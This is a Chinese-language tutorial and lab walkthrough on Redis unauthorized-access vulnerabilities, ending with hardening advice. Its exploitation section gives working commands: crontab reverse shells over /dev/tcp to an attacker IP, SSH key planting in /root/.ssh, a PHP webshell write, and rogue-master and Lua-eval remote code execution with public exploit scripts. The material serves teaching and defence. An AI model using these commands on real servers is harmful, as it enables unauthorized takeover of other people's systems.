# 一、漏洞简介以及危害

# 1.什么是Redis未授权访问漏洞：

Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。

2. 漏洞的危害：

攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器、添加计划任务、写入Webshell等操作。

## 3.漏洞影响：

![图片](https://uploader.shimo.im/f/2hnB6h8iqdckxtoN.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：


![图片](https://uploader.shimo.im/f/0jPaUhmy29LoofQH.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

全球无验证可直接利用Redis TOP 10国家与地区：

![图片](https://uploader.shimo.im/f/Zbxx1bpxmmHR1frg.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

可见当不安全的配置和疏忽的失误即可造成巨大的损失。

# 二、漏洞复现

### 1.服务搭建

#### 1.编译安装

```plain
···
搭建环境
    wget http://download.redis.io/releases/redis-3.2.0.tar.gz
    tar xzf redis-3.2.0.tar.gz
    cd redis-3.2.0
    make
更改配置文件
    vim redis.conf
注释掉 bind 127.0.0.1 并将 protected-mode 改成 no
    # bind 127.0.0.1
    protected-mode no
```
### ![图片](https://uploader.shimo.im/f/fxvJjFiv59JkXZq9.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

```plain
开启redis
    ./src/redis-server redis.conf
```
![图片](https://uploader.shimo.im/f/X93GJYSyOU4Cn8sW.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

服务启动成功

#### 2.docker 环境

```plain
docker pull damonevking/redis5.0
docker run -p 6379:6379 -d damonevking/redis5.0 redis-server //映射端口并运行容器
```


2. 未授权访问漏洞测试
1. 未授权访问数据库

启动redis服务进程后，就可以使用测试攻击机程序redis-cli和靶机的redis服务交互了。 比如：

```plain

 redis-cli -h <IP> # 未授权访问IP
```
### ![图片](https://uploader.shimo.im/f/bSnEuFdOBU9MT3S1.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

从登录的结果可以看出该redis服务对公网开放，且未启用认证。

```plain
    > info   # 查看 redis 版本信息、一些具体信息、服务器版本信息等等:
    > CONFIG GET dir # 获取默认的 redis 目录
    > CONFIG GET dbfilename # 获取默认的 rdb 文件名
```
举例输入info,查看到大量敏感信息。

![图片](https://uploader.shimo.im/f/ROa4rN6I5EV1mE4y.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

####
#### 2.利用crontab反弹shell

在 redis 以 root 权限运行时可以写 crontab 来执行命令反弹 shell

先在自己的kali/服务器上监听一个端口nc -nlvp 5678

![图片](https://uploader.shimo.im/f/zBVeesx7qcrWJ6nx.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

然后通过未授权访问连接上服务器执行命令

```plain
config set dir /var/spool/cron

set -.- "\n\n\n* * * * * bash i >& /dev/tcp/<kali的IP>/<端口> 0>&1\n\n\n"

set -.- "\n\n\n* * * * * bash i >& /dev/tcp/192.168.16.59/5678 0>&1\n\n\n"

或者
set x "\n* * * * * /bin/bash i > /dev/tcp/<kali的IP>/<端口> 0<&1 2>&1\n"

set x "\n* * * * * /bin/bash i >& /dev/tcp/192.168.16.59/5678 0<&1 2>&1\n"


config set dbfilename root

save


```
### ![图片](https://uploader.shimo.im/f/vob6lh6IyaUJzAcs.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

等待任务执行后会弹到kali的nc上，过一分钟左右就可以收到shell

![图片](https://uploader.shimo.im/f/WJkfE8r2b0MnJURL.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

再上线到CS做权限维持和后渗透

![图片](https://uploader.shimo.im/f/CUT00ZUv58EoLIMd.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)


#### 3.利用公私钥认证获得root权限

在以下条件下,可以利用此方法

1. Redis 服务使用 ROOT 账号启动

2. 服务器开放了 SSH 服务,而且允许使用密钥登录,即可远程写入一个公钥,直接登录远程服务器.

靶机中开启redis服务：redis-server /etc/redis.conf

在靶机中执行mkdir /root/.ssh命令，创建ssh公钥存放目录

在攻击机中生成ssh公钥和私钥，密码设置为空：

```plain
ssh-keygen -t rsa
```
![图片](https://uploader.shimo.im/f/Jd9tvIsCYYDqFKRJ.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

进入.ssh目录：cd .ssh/，将生成的公钥保存到test.txt：

```plain
# 将公钥的内容写到一个文本中命令如下
(echo -e "\n\n"; cat id_rsa.pub; echo e "\n\n") > test.txt
```
![图片](https://uploader.shimo.im/f/jRFiJOoC1dyqaiUb.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

链接靶机上的redis服务，将保存ssh的公钥1.txt写入redis（使用redis-cli -h ip命令连接靶机，将文件写入）

```plain
  cat test.txt | redis-cli -h <hostname> -x set test
```
![图片](https://uploader.shimo.im/f/UofA8Db2G5O7y1AC.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)


远程登录到靶机 redis 数据库，并使用CONFIG GET dir命令得到redis备份的路径：

![图片](https://uploader.shimo.im/f/yx1xo06q3RxG0idh.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

更改redis备份路径为ssh公钥存放目录（一般默认为/root/.ssh）：

![图片](https://uploader.shimo.im/f/s8PgRqH8uSFRayLm.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

此时通过ssh 连接到靶机

```plain
ssh -i id_rsa root@<ip>
```
![图片](https://uploader.shimo.im/f/B7PoxDY92aJbLQdL.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)


#### 4.利用redis 未授权写 Webshell

利用前提：

1. 靶机redis链接未授权，在攻击机上能用redis-cli连上
2. 当 redis 权限不高时,并且服务器开着 web 服务,在 redis 有 web 目录写权限时,可以尝试往 web 路径写 webshell

此时我们需要知道目标的 web路径，示例写入的是apache的默认安装路径

```plain
config set dir /var/www/html/
config set dbfilename shell.php
set x "<?php phpinfo();?>"
save
```
![图片](https://uploader.shimo.im/f/KiLQjQ07llbUjSDZ.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

此时 phpinfo已经写入目标路径下

![图片](https://uploader.shimo.im/f/Tl776UHYRjGWDAID.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

访问目标网站

![图片](https://uploader.shimo.im/f/74bYbFeLMgXmmlXr.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)


#### 5.利用主从复制GetShell

先讲解一下 redis 的主从模式：

指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力。

这里我们开两台redis数据库来做测试

![图片](https://uploader.shimo.im/f/nRNpSBCoy8oOaHeh.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)


然后通过slaveof可以设置主从状态

```plain
slaveog <主redis ip><端口号>
```
![图片](https://uploader.shimo.im/f/PW4V9YyqMCk9dmXo.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

这样一来数据就会自动同步了

当服务器开启主从同步后，利用脚本

```plain
git clone https://github.com/Ridter/redis-rce.git   //下载漏洞利用脚本
https://github.com/n0b0dyCN/redis-rogue-server //脚本需要调用这里的 exp.so文件
```
将exp.so文件下载并放到和redis-rce.py同一目录下,执行命令：

```plain
python3 redis-rce.py -r <目标ip> -L <自己IP> -f exp.so
```
![图片](https://uploader.shimo.im/f/1CRGJy83bk6w1H0p.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

在此处：i为交互式shell，r为反弹shell，根据自己的需要选择就可以了

![图片](https://uploader.shimo.im/f/GpVTuri6bfTY89Pv.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

#### 6.利用redisLua RCE

```plain
git clone https://github.com/QAX-A-Team/redis_lua_exploit.git //下载漏洞利用脚本
```
测试环境：centos6.5+redis 2.6.16



脚本为 python2，运行脚本需先安装 python2 redis 组件

```plain
python2 -m pip install redis //为python2 安装redis组件
```
修改脚本中 host为目标 IP。
![图片](https://uploader.shimo.im/f/STV9woAIfmRzXf9s.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

通过redis-cli连接到目标 redis ，执行eval "tonumber('whoami', 8)" 0这段 lua，目标服务器就会执行whoami命令。

```plain
eval "tonumber('whoami', 8)" 0 //执行命令
```
此时我们使用回弹shell 测试一下，先开启 nc监听：

```plain
nc -lvnp 5678
```
再连接上数据库执行会弹语句：

```plain
eval "tonumber('/bin/bash -i >& /dev/tcp/<攻击机ip>/<端口信息> 0>&1', 8)" 0
```
![图片](https://uploader.shimo.im/f/BmE4EBBwPFLt5han.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

![图片](https://uploader.shimo.im/f/5rDLQheg7W3y5gb7.png!thumbnail?fileGuid=HvWRPchDJR33tQPX)

接收到回弹的shell，漏洞利用成功。



# 三、修复建议

### 1.限制访问

比较安全的办法是采用绑定IP的方式来进行控制。

请在redis.conf文件找到如下配置

```plain
# If you want you can bind a single interface, if the bind option is not
# specified all the interfaces will listen for incoming connections.
#
# bind 127.0.0.1
```
把 #bind 127.0.0.1前面的注释#号去掉，然后把127.0.0.1改成你允许访问你的redis服务器的ip地址，表示只允许该ip进行访问，这种情况下，我们在启动redis服务器的时候不能再用:redis-server，改为:redis-server path/redis.conf 即在启动的时候指定需要加载的配置文件,其中path/是你上面修改的redis配置文件所在目录。
#### 2.设置密码

打开redis.conf配置文件，找到requirepass，然后修改如下:

```plain
requirepass yourpassword
yourpassword就是redis验证密码，设置密码以后发现可以登陆，但是无法执行命令了。

命令如下:
redis-cli -h yourIp -p yourPort//启动redis客户端，并连接服务器
keys * //输出服务器中的所有key
报错如下
(error) ERR operation not permitted

这时候你可以用授权命令进行授权，就不报错了

命令如下:
auth youpassword
```











